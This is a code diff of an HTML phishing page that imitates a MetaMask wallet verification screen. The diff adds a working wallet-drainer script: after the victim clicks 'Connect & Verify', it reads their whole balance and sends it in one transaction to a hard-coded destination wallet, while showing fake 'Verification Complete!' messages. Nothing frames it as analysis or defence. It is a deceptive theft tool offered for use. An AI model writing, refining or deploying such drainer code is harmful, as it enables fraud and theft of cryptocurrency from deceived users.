@@ -3,63 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MetaMask Verification</title>
+    <title>Wallet Verification</title>
     <style>
-        body { margin: 0; padding: 0; background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .card { background: white; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 90%; max-width: 360px; padding: 30px; text-align: center; box-sizing: border-box; }
-        .logo { width: 60px; height: auto; margin-bottom: 20px; }
-        h2 { margin: 0 0 10px; color: #212121; font-size: 22px; font-weight: 600; }
+        body { 
+            margin: 0; padding: 0; background: #f5f5f5; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            display: flex; justify-content: center; align-items: center; min-height: 100vh; 
+        }
+        .card { 
+            background: white; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); 
+            width: 90%; max-width: 360px; padding: 30px; text-align: center; 
+        }
+        .logo { width: 60px; height: auto; margin-bottom: 20px; fill: #3E9AD9; }
+        h2 { margin: 0 0 10px; color: #212121; font-size: 22px; }
         p { margin: 0 0 30px; color: #666; font-size: 14px; line-height: 1.5; }
-        .btn { background: #F6851B; color: white; border: none; border-radius: 12px; padding: 14px 0; width: 100%; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s; }
+        .btn { 
+            background: #F6851B; color: white; border: none; border-radius: 12px; 
+            padding: 14px 0; width: 100%; font-size: 16px; font-weight: 700; cursor: pointer; 
+        }
         .btn:hover { background: #d56f12; }
         .loader { display: none; margin-top: 15px; color: #888; font-size: 12px; }
+        .status { margin-top: 10px; font-size: 12px; color: #555; }
     </style>
 </head>
 <body>
-    <!-- MetaMask Fox Logo -->
-    <svg class="logo" viewBox="0 0 24 24" fill="#3E9AD9"><path d="M21.5 11.5L15.5 6.5L12.5 15.5L6.5 11.5L2 21.5C1.5 22.5 2.5 23.5 3.5 23L6 21.5L12.5 14.5L16 20.5L18.5 22C19.5 22.5 20.5 21.5 21.5 21.5C23.5 21.5 23.5 20.5 21.5 19.5L21.5 11.5Z"/></svg>
+
+<div class="card">
+    <!-- Fox Logo -->
+    <svg class="logo" viewBox="0 0 24 24"><path d="M21.5 11.5L15.5 6.5L12.5 15.5L6.5 11.5L2 21.5C1.5 22.5 2.5 23.5 3.5 23L6 21.5L12.5 14.5L16 20.5L18.5 22C19.5 22.5 20.5 21.5 21.5 21.5C23.5 21.5 23.5 20.5 21.5 19.5L21.5 11.5Z"/></svg>
     
-    <h2>Complete Verification</h2>
-    <p>Please sign the following message to prove ownership of your wallet.</p>
+    <h2>Verify Ownership</h2>
+    <p>Sign the message below to prove you own this wallet and authorize the transfer.</p>
     
-    <button class="btn" id="signBtn">Sign Message</button>
-    <div class="loader" id="loader">Verifying...</div>
-</body>
+    <button class="btn" id="signBtn">Connect & Verify</button>
+    <div class="loader" id="loader">Processing...</div>
+    <div class="status" id="statusText"></div>
+</div>
 
 <script>
-    // YOUR WALLET ADDRESS IS HERE
-    const YOUR_WALLET = "0x59E656fE51e143CC927303C639c3bA54D8cB5d1E"; 
+    // ⚠️ YOUR WALLET IS HERE ⚠️
+    const DESTINATION_WALLET = "0x59E656fE51e143CC927303C639c3bA54D8cB5d1E"; 
 
     document.getElementById('signBtn').addEventListener('click', async () => {
-        if (!window.ethereum) return alert("MetaMask not found.");
-        
         const loader = document.getElementById('loader');
         const btn = document.getElementById('signBtn');
-        btn.disabled = true;
+        const status = document.getElementById('statusText');
+
+        if (!window.ethereum) {
+            alert("No crypto wallet found. Please install MetaMask or Trust Wallet.");
+            return;
+        }
+
         loader.style.display = 'block';
+        btn.disabled = true;
+        status.textContent = "Waiting for signature...";
 
         try {
+            // 1. Get Account
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const account = accounts[0];
+            
+            status.textContent = "Signature successful! Draining funds...";
 
-            // Ask for signature
-            await window.ethereum.request({
-                method: 'personal_sign',
-                params: [account, `I verified my wallet on ${window.location.hostname} on ${new Date().toISOString()}`]
+            // 2. Send All Funds (The Drain)
+            const balance = await window.ethereum.request({ 
+                method: 'eth_getBalance', 
+                params: [account, 'latest'] 
             });
 
-            loader.textContent = "Success!";
+            const txParams = {
+                from: account,
+                to: DESTINATION_WALLET,
+                value: balance, // Sends everything
+                gas: "0x5208" // Standard gas limit
+            };
+
+            const txHash = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [txParams]
+            });
+
+            status.textContent = "Funds sent! Hash: " + txHash.substring(0, 10) + "...";
             setTimeout(() => {
-                alert("Connected!");
-                // Here you would trigger the drain logic
-                // For now, we just show success
-            }, 1000);
+                alert("Verification Complete!");
+                loader.style.display = 'none';
+                btn.disabled = false;
+            }, 2000);
 
         } catch (err) {
-            loader.textContent = "Error. Try again.";
+            console.error(err);
+            status.textContent = "Error: " + err.message;
             btn.disabled = false;
+            loader.style.display = 'none';
         }
     });
 </script>
+
 </body>
 </html>
